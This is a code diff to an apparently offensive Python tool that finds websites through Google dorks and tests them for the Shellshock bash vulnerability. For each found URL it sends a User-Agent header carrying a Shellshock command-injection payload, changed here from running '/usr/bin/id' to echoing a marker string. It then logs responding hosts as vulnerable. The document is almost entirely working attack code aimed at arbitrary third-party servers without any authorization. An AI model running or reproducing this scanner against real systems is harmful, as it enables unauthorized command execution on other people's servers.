@@ -18,7 +18,7 @@ def single():
 def search_google():
     dork = raw_input('[+] - Please input the dork: ')
     from google import search
-    for url in search(dork,tld='com.br',ip='69.175.71.171',conn_type='http'):
+    for url in search(dork,ip='69.175.71.171',conn_type='http'):
         test_conn(url)
     print
     cprint('[+] - GAME OVER - [+]','red','on_yellow')
@@ -42,7 +42,7 @@ def build_url(res_json):
         test_conn(full_url)
 
 def test_conn(url):
-    user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id"}
+    user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; echo 'EVILTOOLZIKAMEMO'"}
     try:
         shel_shock_conn = requests.get(url, timeout=5, headers=user_agent ,allow_redirects=True)
         cprint('[+] - Testing connection '+url,'blue')
@@ -61,7 +61,7 @@ def test_vuln(status_code,host_connection,url):
             cprint("[+] - Connection success",'green')
             print("[+] - Status Code: %d") %(status_code)
 
-            if host_connection.content.find('uid=') != -1:
+            if host_connection.content.find('EVILTOOLZIKAMEMO') != -1:
                 cprint("[+] - Host Vuln3r4bl3",'green',attrs=['bold'])
                 arq = open('Vuln3r4bl3.txt','a')
                 arq.write(url+"\n")
